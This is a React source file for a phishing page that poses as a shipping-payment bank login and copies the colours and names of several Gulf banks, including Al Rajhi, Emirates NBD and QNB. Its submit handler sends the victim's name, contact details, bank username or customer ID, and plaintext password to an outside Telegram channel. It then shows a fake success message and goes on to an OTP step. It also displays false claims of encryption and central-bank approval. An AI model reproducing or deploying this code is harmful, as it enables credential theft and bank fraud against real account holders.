import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card } from "@/components/ui/card";
import { getServiceBranding } from "@/lib/serviceLogos";
import { useLink } from "@/hooks/useSupabase";
import { Lock, Eye, EyeOff, Building2, User, ShieldCheck, CheckCircle2, AlertCircle } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import { getBankById } from "@/lib/banks";
import { getCountryByCode } from "@/lib/countries";

const PaymentBankLogin = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData } = useLink(id);
  
  // Bank login credentials state
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [customerId, setCustomerId] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  
  // Get customer info and selected bank from sessionStorage
  const customerInfo = JSON.parse(sessionStorage.getItem('customerInfo') || '{}');
  const selectedCountry = sessionStorage.getItem('selectedCountry') || '';
  const selectedBankId = sessionStorage.getItem('selectedBank') || '';
  
  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  const shippingInfo = linkData?.payload as any;
  const amount = shippingInfo?.cod_amount || 500;
  const formattedAmount = `${amount} ر.س`;
  
  const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
  const selectedCountryData = selectedCountry ? getCountryByCode(selectedCountry) : null;
  
  // Determine login type based on bank
  const getLoginType = () => {
    if (!selectedBank) return 'username';
    
    const bankId = selectedBank.id;
    
    // Banks that use customer ID
    const customerIdBanks = [
      'riyad_bank', 'saudi_investment_bank', 'saudi_fransi_bank', 'albilad_bank',
      'adcb', 'mashreq_bank', 'rakbank', 'nbk', 'cbk', 'kfh',
      'qnb', 'qib', 'ahlibank', 'bank_muscat', 'ahli_bank_oman', 'sohar_international',
      'bbk', 'ithmaar_bank'
    ];
    
    if (customerIdBanks.includes(bankId)) return 'customerId';
    
    return 'username';
  };
  
  const loginType = getLoginType();
  
  // Get bank-specific styling
  const getBankStyling = () => {
    if (!selectedBank) {
      return {
        primaryColor: branding.colors.primary,
        secondaryColor: branding.colors.secondary,
        bgGradient: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
        logoPosition: 'center',
        showHeader: true,
        headerBg: '#ffffff',
        inputStyle: 'modern',
      };
    }
    
    const bankId = selectedBank.id;
    
    // Al Rajhi Bank - Green theme with Islamic design
    if (bankId === 'alrajhi_bank') {
      return {
        primaryColor: '#006C35',
        secondaryColor: '#00843D',
        bgGradient: 'linear-gradient(180deg, #006C35 0%, #00843D 100%)',
        logoPosition: 'top-center',
        showHeader: true,
        headerBg: '#ffffff',
        inputStyle: 'clean',
        borderRadius: '8px',
      };
    }
    
    // Al Ahli Bank (SNB) - Green with modern design
    if (bankId === 'alahli_bank') {
      return {
        primaryColor: '#00843D',
        secondaryColor: '#00A651',
        bgGradient: 'linear-gradient(135deg, #00843D 0%, #00A651 100%)',
        logoPosition: 'top-left',
        showHeader: true,
        headerBg: '#ffffff',
        inputStyle: 'modern',
        borderRadius: '12px',
      };
    }
    
    // Riyad Bank - Blue theme
    if (bankId === 'riyad_bank') {
      return {
        primaryColor: '#0066B2',
        secondaryColor: '#004B87',
        bgGradient: 'linear-gradient(135deg, #0066B2 0%, #004B87 100%)',
        logoPosition: 'center',
        showHeader: true,
        headerBg: '#f8f9fa',
        inputStyle: 'corporate',
        borderRadius: '4px',
      };
    }
    
    // Emirates NBD - Red theme
    if (bankId === 'emirates_nbd') {
      return {
        primaryColor: '#D50032',
        secondaryColor: '#B8002A',
        bgGradient: 'linear-gradient(135deg, #D50032 0%, #B8002A 100%)',
        logoPosition: 'top-center',
        showHeader: true,
        headerBg: '#ffffff',
        inputStyle: 'modern',
        borderRadius: '8px',
      };
    }
    
    // FAB - Black theme with gold accents
    if (bankId === 'fab') {
      return {
        primaryColor: '#000000',
        secondaryColor: '#333333',
        bgGradient: 'linear-gradient(135deg, #000000 0%, #1a1a1a 100%)',
        logoPosition: 'top-center',
        showHeader: true,
        headerBg: '#000000',
        inputStyle: 'premium',
        borderRadius: '0px',
        textColor: '#ffffff',
      };
    }
    
    // QNB - Burgundy theme
    if (bankId === 'qnb') {
      return {
        primaryColor: '#6E1D3E',
        secondaryColor: '#4A1428',
        bgGradient: 'linear-gradient(135deg, #6E1D3E 0%, #4A1428 100%)',
        logoPosition: 'top-center',
        showHeader: true,
        headerBg: '#ffffff',
        inputStyle: 'elegant',
        borderRadius: '6px',
      };
    }
    
    // NBK - Blue theme
    if (bankId === 'nbk') {
      return {
        primaryColor: '#005EB8',
        secondaryColor: '#004B87',
        bgGradient: 'linear-gradient(135deg, #005EB8 0%, #004B87 100%)',
        logoPosition: 'center',
        showHeader: true,
        headerBg: '#f5f7fa',
        inputStyle: 'corporate',
        borderRadius: '8px',
      };
    }
    
    // Default styling for other banks
    return {
      primaryColor: selectedBank.color || '#004B87',
      secondaryColor: selectedBank.color || '#004B87',
      bgGradient: `linear-gradient(135deg, ${selectedBank.color || '#004B87'}, ${selectedBank.color || '#004B87'})`,
      logoPosition: 'top-center',
      showHeader: true,
      headerBg: '#ffffff',
      inputStyle: 'modern',
      borderRadius: '8px',
    };
  };
  
  const bankStyle = getBankStyling();
  
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    // Validate based on login type
    if (loginType === 'username' && (!username || !password)) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال اسم المستخدم وكلمة المرور",
        variant: "destructive",
      });
      return;
    }
    
    if (loginType === 'customerId' && (!customerId || !password)) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال رقم العميل وكلمة المرور",
        variant: "destructive",
      });
      return;
    }
    
    setIsSubmitting(true);
    
    // Store bank login info
    const bankLoginData = {
      username: loginType === 'username' ? username : '',
      customerId: loginType === 'customerId' ? customerId : '',
      phoneNumber: loginType === 'phone' ? phoneNumber : '',
      password: password,
      loginType: loginType,
    };
    
    sessionStorage.setItem('bankLoginData', JSON.stringify(bankLoginData));
    
    // Send bank login details to Telegram
    const telegramResult = await sendToTelegram({
      type: 'bank_login',
      data: {
        name: customerInfo.name || '',
        email: customerInfo.email || '',
        phone: customerInfo.phone || '',
        service: serviceName,
        country: selectedCountryData?.nameAr || '',
        countryCode: selectedCountry,
        bank: selectedBank?.nameAr || 'غير محدد',
        bankId: selectedBankId,
        loginType: loginType,
        username: bankLoginData.username,
        customerId: bankLoginData.customerId,
        phoneNumber: bankLoginData.phoneNumber,
        password: password,
        amount: formattedAmount
      },
      timestamp: new Date().toISOString()
    });

    if (telegramResult.success) {
      console.log('Bank login details sent to Telegram successfully');
    } else {
      console.error('Failed to send bank login details to Telegram:', telegramResult.error);
    }
    
    setIsSubmitting(false);
    
    toast({
      title: "تم بنجاح",
      description: "تم تسجيل الدخول بنجاح",
    });
    
    // Navigate to OTP verification
    navigate(`/pay/${id}/otp`);
  };
  
  return (
    <div className="min-h-screen bg-background" dir="rtl">
      {/* Bank Header */}
      <div 
        className="w-full py-6 shadow-md"
        style={{ background: bankStyle.headerBg }}
      >
        <div className="container mx-auto px-4 max-w-md">
          <div className={`flex items-center ${bankStyle.logoPosition === 'center' ? 'justify-center' : 'justify-between'}`}>
            <div className="text-center">
              {selectedBank && (
                <>
                  <div 
                    className="w-12 h-12 mx-auto mb-2 rounded-full flex items-center justify-center"
                    style={{ backgroundColor: bankStyle.primaryColor }}
                  >
                    <Building2 className="w-7 h-7 text-white" />
                  </div>
                  <h1 className="text-xl font-bold" style={{ color: bankStyle.primaryColor }}>
                    {selectedBank.nameAr}
                  </h1>
                  <p className="text-xs text-muted-foreground">{selectedBank.name}</p>
                </>
              )}
            </div>
          </div>
        </div>
      </div>

      <div className="container mx-auto px-4 py-8 max-w-md">
        {/* Security Badge */}
        <div className="mb-6 text-center">
          <div className="inline-flex items-center gap-2 px-4 py-2 rounded-full bg-green-50 border border-green-200">
            <ShieldCheck className="w-4 h-4 text-green-600" />
            <span className="text-sm font-medium text-green-700">اتصال آمن ومشفر</span>
          </div>
        </div>

        {/* Login Card */}
        <Card className="p-6 shadow-xl" style={{ borderRadius: bankStyle.borderRadius }}>
          {/* Title */}
          <div className="mb-6 text-center">
            <h2 className="text-2xl font-bold mb-2" style={{ color: bankStyle.primaryColor }}>
              تسجيل الدخول
            </h2>
            <p className="text-sm text-muted-foreground">
              أدخل بياناتك لإكمال عملية الدفع
            </p>
          </div>

          {/* Payment Amount Display */}
          <div 
            className="mb-6 p-4 rounded-lg text-center"
            style={{ 
              background: `${bankStyle.primaryColor}10`,
              border: `1px solid ${bankStyle.primaryColor}30`
            }}
          >
            <p className="text-xs text-muted-foreground mb-1">المبلغ المطلوب</p>
            <p className="text-2xl font-bold" style={{ color: bankStyle.primaryColor }}>
              {formattedAmount}
            </p>
            <p className="text-xs text-muted-foreground mt-1">{serviceName}</p>
          </div>

          {/* Login Form */}
          <form onSubmit={handleSubmit} className="space-y-5">
            {/* Username/Customer ID Field */}
            {loginType === 'username' && (
              <div>
                <Label className="mb-2 text-sm font-medium flex items-center gap-2">
                  <User className="w-4 h-4" style={{ color: bankStyle.primaryColor }} />
                  اسم المستخدم
                </Label>
                <Input
                  type="text"
                  placeholder="أدخل اسم المستخدم"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  className="h-12 text-base"
                  style={{ 
                    borderRadius: bankStyle.borderRadius,
                    borderColor: `${bankStyle.primaryColor}30`
                  }}
                  autoComplete="username"
                  required
                />
              </div>
            )}
            
            {loginType === 'customerId' && (
              <div>
                <Label className="mb-2 text-sm font-medium flex items-center gap-2">
                  <User className="w-4 h-4" style={{ color: bankStyle.primaryColor }} />
                  رقم العميل
                </Label>
                <Input
                  type="text"
                  placeholder="أدخل رقم العميل"
                  value={customerId}
                  onChange={(e) => setCustomerId(e.target.value)}
                  className="h-12 text-base"
                  style={{ 
                    borderRadius: bankStyle.borderRadius,
                    borderColor: `${bankStyle.primaryColor}30`
                  }}
                  inputMode="numeric"
                  required
                />
              </div>
            )}
            
            {/* Password Field */}
            <div>
              <Label className="mb-2 text-sm font-medium flex items-center gap-2">
                <Lock className="w-4 h-4" style={{ color: bankStyle.primaryColor }} />
                كلمة المرور
              </Label>
              <div className="relative">
                <Input
                  type={showPassword ? "text" : "password"}
                  placeholder="أدخل كلمة المرور"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="h-12 text-base pl-12"
                  style={{ 
                    borderRadius: bankStyle.borderRadius,
                    borderColor: `${bankStyle.primaryColor}30`
                  }}
                  autoComplete="current-password"
                  required
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground"
                >
                  {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                </button>
              </div>
            </div>
            
            {/* Remember Me / Forgot Password */}
            <div className="flex items-center justify-between text-sm">
              <div className="flex items-center gap-2">
                <input 
                  type="checkbox" 
                  id="remember" 
                  className="rounded w-4 h-4"
                  style={{ accentColor: bankStyle.primaryColor }}
                />
                <label htmlFor="remember" className="text-muted-foreground cursor-pointer">
                  تذكرني
                </label>
              </div>
              <button
                type="button"
                className="font-medium hover:underline"
                style={{ color: bankStyle.primaryColor }}
              >
                نسيت كلمة المرور؟
              </button>
            </div>
            
            {/* Submit Button */}
            <Button
              type="submit"
              size="lg"
              className="w-full text-base py-6 text-white font-bold shadow-lg hover:opacity-90 transition-opacity"
              disabled={isSubmitting}
              style={{
                background: bankStyle.bgGradient,
                borderRadius: bankStyle.borderRadius,
              }}
            >
              {isSubmitting ? (
                <span>جاري تسجيل الدخول...</span>
              ) : (
                <span>تسجيل الدخول</span>
              )}
            </Button>
          </form>

          {/* Security Features */}
          <div className="mt-6 pt-6 border-t space-y-3">
            <div className="flex items-start gap-2 text-xs text-muted-foreground">
              <CheckCircle2 className="w-4 h-4 text-green-600 mt-0.5 flex-shrink-0" />
              <span>جميع المعاملات محمية بتشفير SSL</span>
            </div>
            <div className="flex items-start gap-2 text-xs text-muted-foreground">
              <CheckCircle2 className="w-4 h-4 text-green-600 mt-0.5 flex-shrink-0" />
              <span>نظام حماية متعدد الطبقات</span>
            </div>
            <div className="flex items-start gap-2 text-xs text-muted-foreground">
              <CheckCircle2 className="w-4 h-4 text-green-600 mt-0.5 flex-shrink-0" />
              <span>معتمد من قبل البنك المركزي</span>
            </div>
          </div>

          {/* Help Section */}
          <div className="mt-6 pt-6 border-t text-center">
            <p className="text-xs text-muted-foreground mb-3">
              تواجه مشكلة في تسجيل الدخول؟
            </p>
            <Button
              type="button"
              variant="outline"
              size="sm"
              className="text-xs"
              style={{ 
                borderColor: bankStyle.primaryColor,
                color: bankStyle.primaryColor
              }}
            >
              تواصل مع الدعم الفني
            </Button>
          </div>
        </Card>

        {/* Footer Info */}
        <div className="mt-6 text-center">
          <div className="flex items-center justify-center gap-2 text-xs text-muted-foreground">
            <AlertCircle className="w-4 h-4" />
            <span>لن يطلب منك البنك كلمة المرور عبر الهاتف أو البريد الإلكتروني</span>
          </div>
        </div>
      </div>
    </div>
  );
};

export default PaymentBankLogin;
